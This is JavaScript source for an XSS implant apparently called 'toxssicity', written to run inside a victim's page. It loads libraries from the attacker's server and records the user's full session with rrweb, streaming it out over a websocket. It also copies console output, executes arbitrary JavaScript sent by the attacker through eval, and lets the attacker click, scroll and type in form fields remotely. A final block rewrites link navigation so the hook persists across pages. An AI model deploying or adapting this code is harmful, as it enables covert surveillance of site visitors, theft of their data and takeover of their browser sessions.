const currentScript = document.currentScript;

if (!currentScript || !currentScript.src) {
    throw new Error('[toxssicity] Unable to determine script URL');
}

const scriptUrl = new URL(currentScript.src);

// Automatically determine server origin
const serverOrigin = scriptUrl.origin;

if (scriptUrl.protocol !== 'https:') {
    throw new Error('[toxssicity] HTTPS is required');
}

console.log('[toxssicity] Configuration server:', serverOrigin);


(function() {

function loadScript(src, callback) {
var s = document.createElement('script'); s.src = src; s.onload = () => { callback(); }; s.onerror = (err) => console.error('[toxssicity] Failed to load script: ' + src, err); document.head.appendChild(s);
}

loadScript(serverOrigin + '/ext-deps/js/socket.io.min.js', function() {
loadScript(serverOrigin + '/ext-deps/js/rrweb.min.js', function() {
    const socket = io(serverOrigin , { transports: ['websocket'] });
    
    let isControlGranted = true; 
    let recordStopFn = null;

    socket.on('connect_error', (err) => console.error('[toxssicity] Socket.IO Error:', err.message));

    function parseUserEnv() {
        var ua = navigator.userAgent, b = "Unknown Browser", os = "Unknown OS";
        if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua)) b = "Chrome"; else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) b = "Safari"; else if (/firefox|fxios/i.test(ua)) b = "Firefox"; else if (/edge|edg/i.test(ua)) b = "Edge";
        if (/windows/i.test(ua)) os = "Windows NT"; else if (/macintosh|mac os x/i.test(ua)) os = "macOS"; else if (/linux/i.test(ua)) os = "Linux"; else if (/iphone|ipad/i.test(ua)) os = "iOS"; else if (/android/i.test(ua)) os = "Android";
        return { browser: b, os: os, origin: window.location.origin };
    }

    socket.on('connect', () => {
        socket.emit('register-specs', parseUserEnv());
    });

    function startCapture() {
        if (recordStopFn) recordStopFn();
        recordStopFn = rrweb.record({ emit(event) { socket.emit('record-event', event); } });
    }

    startCapture();

    socket.on('request-snapshot', () => {
        startCapture();
    });

    const originalConsoleLog = console.log;
    console.log = function(...args) {
        originalConsoleLog.apply(console, args); 
        if (!args[0] || (typeof args[0] === 'string' && !args[0].startsWith('[toxssicity]'))) {
            socket.emit('client-js-result', { type: 'log', data: args.join(' '), clientId: socket.id });
        }
    };

    socket.on('execute-js', (code) => {
        let result;
        try {
            result = eval(code);
            if (result !== undefined) {
                socket.emit('client-js-result', { type: 'result', data: String(result), clientId: socket.id });
            }
        } catch (error) {
            socket.emit('client-js-result', { type: 'error', data: error.toString(), clientId: socket.id });
        }
    });

    socket.on('control-requested', () => {
        isControlGranted = true;
        socket.emit('control-approved');
    });

    socket.on('execute-action', (data) => {
        if (!isControlGranted) return;
        if (data.action === 'click') {
            const x = window.innerWidth * data.px; const y = window.innerHeight * data.py; const targetEl = document.elementFromPoint(x, y); if (targetEl) { targetEl.click(); targetEl.focus(); }
        }
        if (data.action === 'scroll-down') {
			window.scrollBy({
				top: 400,
				left: 0,
				behavior: 'smooth'
			});
		}
        if (data.action === 'scroll-up') {
			window.scrollBy({
				top: -400,
				left: 0,
				behavior: 'smooth'
			});
		}
        if (data.action === 'scroll-left') {
			window.scrollBy({
				top: 0,
				left: -400,
				behavior: 'smooth'
			});
		}
        if (data.action === 'scroll-right') {
			window.scrollBy({
				top: 0,
				left: 400,
				behavior: 'smooth'
			});
		}
        if (data.action === 'keydown') {
            const activeEl = document.activeElement;
            if (activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA')) {
                if (data.key === 'Backspace') { activeEl.value = activeEl.value.slice(0, -1); } else if (data.key.length === 1) { activeEl.value += data.key; }
                activeEl.dispatchEvent(new Event('input', { bubbles: true })); activeEl.dispatchEvent(new Event('change', { bubbles: true }));
            }
        }
    });
});
});
})();


(() => {
    if (window.__navigationDemo) return;
    window.__navigationDemo = true;
    document.addEventListener("click", async (event) => {
        const link = event.target.closest("a");
        if (!link || !link.href) return;
        if (link.origin !== location.origin) return;
        if (link.target === "_blank") return;
        if (event.ctrlKey || event.metaKey || event.shiftKey) return;
        event.preventDefault();
        const destination = new URL(link.href);
        try {
            const response = await fetch(destination.href);
            const html = await response.text();
            const parsed = new DOMParser().parseFromString(
                html,
                "text/html"
            );
            // Update the visible page
            document.title = parsed.title;
            document.body.replaceChildren(
                ...Array.from(parsed.body.childNodes)
            );
            // Update the address without a full reload
            history.pushState({}, "", destination.href);
        } catch (error) {
            console.error("[Demo] Navigation failed:", error);
        }
    }, true);
})();


